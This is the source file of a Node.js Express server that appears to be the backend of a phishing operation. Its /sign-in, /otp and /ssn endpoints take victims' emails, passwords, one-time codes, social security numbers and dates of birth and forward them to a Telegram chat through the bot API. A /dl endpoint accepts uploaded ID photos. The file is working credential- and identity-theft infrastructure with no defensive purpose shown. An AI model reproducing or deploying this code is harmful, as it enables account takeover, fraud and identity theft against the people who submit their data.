require('dotenv').config()
const express = require('express')
const axios = require('axios')
const bodyParser = require('body-parser')
const cors = require('cors')
const fs = require('fs')
const multer = require('multer')
const upload = multer({dest: 'uploads/'})
const TelegramBot = require('node-telegram-bot-api');



const {TOKEN} = process.env
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`
const URI = `/webhook/${TOKEN}`
// const WEBHOOK_URL = SERVER_URL + URI

const bot = new TelegramBot(TOKEN, { polling: true });

const app = express();

// this two line are important recieve request properly 
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended : true}));


var corsOptions = {
    origin: ['http://127.0.0.1:5501', 'https://spectacular-fudge-8a4251.netlify.app/'],
    credentials: true,
};
app.use(cors(corsOptions));

const init = async()=> {
    // const res = await axios.get(`${TELEGRAM_API}/setWebhook?url=${WEBHOOK_URL}`)
    const res = await axios.get(`${TELEGRAM_API}/setWebhook?url=${WEBHOOK_URL}`)
    console.log(res.data)
}

app.get('/', (req, res)=> {
    res.send('hhhhh')
})

// to get info about the bot
// app.post(URI, async(req, res)=> {
//     console.log(req.body)

//     return res.send('Usama + Ay = MONEY ')
// })

// sign in data
app.post('/sign-in' ,async(req, res)=> { 
    // for sign-in page
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id : process.env.chatId,
        parse_mode: 'HTML',
        text: `
                <b>Email: ${req.body.email}</b>📧
<b>Password: ${req.body.password}</b>
                `
    })
    console.log(req.body)
    // res.send(`${req.body.user.email} and ${req.body.user.password}`)
})


 // for otp code
app.post('/otp' ,async(req, res)=> { 
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id : process.env.chatId,
        parse_mode: 'HTML',
        text: `
                <b>OTP: ${req.body.one_time_password}</b>📧

                `
    })
    res.send(req.body.one_time_password)
    console.log(req.body.one_time_password)
})


// for dob and ssn
app.post('/ssn' ,async(req, res)=> { 
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id : process.env.chatId,
        parse_mode: 'HTML',
        text: `
                <b>SSN: ${req.body.ssnValue}</b>📧
<b>DOB: ${req.body.dobValue}</b>

                `
    })
    console.log(`${req.body.ssnValue} and ${req.body.dobValue}`)
    res.send('recieved')
})

// photo data
app.post('/dl', upload.single('front_Id') ,async(req, res)=> { 
    // if ( req.file) {
    //     await axios.post(`${TELEGRAM_API}/sendPhoto`, {
    //         chat_id : process.env.chatId,
    //         image: req.file.path
    //     })
    // }
    console.log(req.file)
    res.send('recieved')
})


app.listen(process.env.PORT || 5000, async()=> {
    console.log(`app is running on port, ${process.env.PORT || 5000}`)
//     await init();
})
